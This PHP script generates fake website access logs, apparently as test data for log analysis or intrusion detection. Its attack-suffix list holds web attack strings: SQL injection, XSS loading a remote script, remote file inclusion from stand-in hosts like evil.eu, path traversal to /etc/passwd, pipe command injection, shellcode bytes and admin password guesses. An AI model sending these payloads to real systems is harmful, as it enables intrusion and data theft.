<?php

// Settings - Configuration
$timezone = 'Europe/Athens';

$request_ips = [
    '54.36.149.94', //France
    '45.61.164.120', // USA
    '220.243.135.5', // China
    '121.225.26.201', // China
    '87.251.81.179', // Russia
    '54.36.149.52', // France
    '209.133.212.79', // USA
    '115.221.121.44', // China
    '5.13.35.65', // Romania
    '183.87.255.54', // India
    '31.184.238.22', // Russia
    '182.34.27.162', // China
    '1.2.169.95', // Thailand,
    '39.36.99.88', // Pakistan
    '62.109.16.162', // Russia
    '86.125.112.230', // Romania
    '103.36.79.144', // India
    '91.138.198.224', // Greece
    '91.138.198.224', // Greece
    '91.138.198.224', // Greece
    '91.138.198.224', // Greece
    '91.138.198.224', // Greece
    '91.138.198.224', // Greece
    '91.138.198.224', // Greece
    '91.138.198.224', // Greece
    '91.138.198.224', // Greece
    '91.138.198.224', // Greece
    '91.138.198.224', // Greece
    '91.138.198.224', // Greece
];

$attack_suffix = [
    0 => '',
    1 => '',
    2 => '',
    3 => '',
    4 => '',
    5 => '',
    6 => '',
    7 => '',
    8 => '',
    9 => '',
    10 => '',
    11 => '?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh',
    12 => '?username=admin&password=1234',
    13 => '?username=admin&password=1235',
    14 => '?username=admin&password=1236',
    15 => '?username=admin&password=1237',
    16 => '?username=admin&password=1238',
    17 => '?username=admin&password=1239',
    18 => '?username=admin&password=admin',
    19 => '?username=admin&password=password',
    20 => '?username=admin&password=admin2',
    21 => "?page=1&customerId=AND%id%IS%NULL;",
    22 => "?customerId=1OR%201=1",
    23 => "?file=http://evil.eu/sh",
    24 => "?file=http://evil.eu/root.asp",
    25 => '?post==<?php print $settings[database][password]; ?>',
    26 => '?ip=|+ls+-l',
    27 => '?id=0%20or%201=1',
    28 => '?post=%3script%3ealert(1);',
    29 => '?session=duf8423ufdjr49cce3ije33ssaq2223',
    30 => '?session=vwdefcwec334scfdjr49ccededfewsd',
    31 => '?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00',
    32 => '?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e',
    33 => '?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00',
    34 => '%u0061?[buffer]=89898',
    35 => '%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh',
    36 => '?user=admin&amount=100000',
    37 => '%2e%2e%2f%2e%2e%2f%2e%2e%2ffile:///etc/passwd',
    38 => '?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git',
    39 => '?page=/../../../../../../etc/passwd',
    40 => '?page=http://192.168.80.128/rfi.php',
    41 => '?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php',
    42 => '.env/README.txt',
    43 => '.well-known/allowed/',
];

$request_paths = [
    '/login.php/',
    '/home/',
    '/register.php/',
    '/orders.php/',
    '/page/about-us/',
    '/blog/how-to-shop/',
    '/blog/better-products-for-2019/',
    '/blog/our-proposals/',
    '/',
    '/',
    '/',
    '/',
    '/',
    '/',
    '/',
    '/',
    '/',
    '/',
    '/index.php/',
    '/index.php/',
    '/index.php/',
    '/index.php/',
    '/index.php/',
    '/core/files/js/upload.js/',
    '/core/files/js/editor.js/',
    '/core/themes/theme.inc/',
    '/update.php/',
    '/connection.php/',
    '/xmlrpc.php/',
    '/authorize.php/',
    '/api/v1/customers/',
    '/api/v1/login/',
    '/api/v1/orders/',
    '/api/v1/register/',
    '/cgi-bin/count.cgi/'
];

$request_ports = [
    '8000',
    '443',
    '443',
    '80',
    '80',
    '80',
    '80',
    '80',
    '80',
    '80',
    '80',
    '80',
    '80',
];

$request_http_verbs = [
    'POST',
    'POST',
    'POST',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
    'GET',
];

$request_http_status = [
    '304',
    '304',
    '304',
    '304',
    '304',
    '304',
    '304',
    '304',
    '304',
    '304',
    '304',
    '304',
    '304',
    '304',
    '304',
    '404',
    '404',
    '404',
    '404',
    '404',
    '404',
    '404',
    '404',
    '404',
    '404',
    '404',
    '404',
    '408',
    '408',
    '408',
    '408',
    '408',
    '408',
    '408',
    '408',
    '408',
    '408',
    '408',
    '503',
    '503',
    '503',
    '503',
    '503',
    '503',
    '503',
    '503',
    '503',
    '503',
    '503',
    '503',
    '503',
    '503',
    '503',
    '503',
    '503',
    '504',
    '504',
    '504',
    '504',
    '504',
    '504',
    '504',
    '504',
    '504',
    '504',
    '504',
    '504',
    '504',
    '504',
    '504',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
    '200',
];

$request_users = [
    'admin',
    'admin1',
    'admin2',
    'admin3',
    'bob',
    'mary88',
    'mary89',
    'sissy',
    'nick23',
    'pianoplayer1990',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
    'anonymous',
];

/**
 * @param $filename
 * @param $text
 * @return bool|int
 */
function appendToFile($filename, $text) {
    $file = file_put_contents($filename, $text.PHP_EOL , FILE_APPEND | LOCK_EX);
    return $file;
}

/**
 * @param array $array
 * @return mixed
 */
function randomArrayValue($array) {
    return $array[array_rand($array)];
}

/**
 * @param array $settings
 * @return string
 */
function createLogRow($settings) {
    $ip = $settings['ip'];
    $port = $settings['port'];
    $user = $settings['user'];
    $path = $settings['path'];
    $attack = $settings['attack'];
    $verb = $settings['verb'];
    $status = $settings['status'];
    $date = $settings['date'];
    $http = $settings['http'];

    $blob = rand(0, 90000);

    $log = $date ." ". $user ." ". $ip ." \"". $verb ." ". $port ." ". $path.$attack . " " .$http. "\" " . $status ." ". $blob;

    return $log;
}



/**
 * @param int $offset
 * @return false|string
 */
function generateTimestamp($offset) {
    date_default_timezone_set($GLOBALS['timezone']);
    $date = date("Y-m-d\TH:i:s", strtotime("+$offset sec"));

    return $date;
}

/**
 * @param string $source
 * @param int $level
 * @return bool|string
 */
function gzCompressFile($source, $level = 9){
    $destination = $source . '.gz';
    $mode = 'wb' . $level;
    $error = false;
    if ($fp_out = gzopen($destination, $mode)) {
        if ($fp_in = fopen($source,'rb')) {
            while (!feof($fp_in))
                gzwrite($fp_out, fread($fp_in, 1024 * 512));
            fclose($fp_in);
        } else {
            $error = true;
        }
        gzclose($fp_out);
    } else {
        $error = true;
    }
    if ($error) {
        return false;
    }
    else {
        return $destination;
    }
}

/**
 * @param int $items
 * @return string
 */
function generateLogs($items = 1) {
    $logs = "";

    for ($i = 1; $i <= $items; $i++) {
        $settings['ip'] = randomArrayValue($GLOBALS['request_ips']);
        $settings['port'] = randomArrayValue($GLOBALS['request_ports']);
        $settings['user'] = randomArrayValue($GLOBALS['request_users']);
        $settings['path'] = randomArrayValue($GLOBALS['request_paths']);
        $settings['attack'] = randomArrayValue($GLOBALS['attack_suffix']);
        $settings['verb'] = randomArrayValue($GLOBALS['request_http_verbs']);
        $settings['status'] = randomArrayValue($GLOBALS['request_http_status']);
        $settings['date'] = generateTimestamp($i);
        $settings['http'] = "HTTP/1.1";

        $logs = $logs . createLogRow($settings) . "\n";
    }

    return $logs;
}

/**
 * @param int $log_items
 * @param int $files_number
 * @param string $directory
 * @param string $name
 */
function generateLogFiles($log_items = 10000, $files_number = 10, $directory = 'logs', $name = 'website-access.log') {
    if(!is_dir($directory)){
        mkdir($directory, 0755, true);
    }

    for ($i = 1; $i <= $files_number; $i++) {
        $logs = generateLogs($log_items);
        $filename = $directory . '/' . $name . '.' . $i;
        appendToFile($filename, $logs);
        gzCompressFile($filename);
    }
}

// Generate gz logs
generateLogFiles();
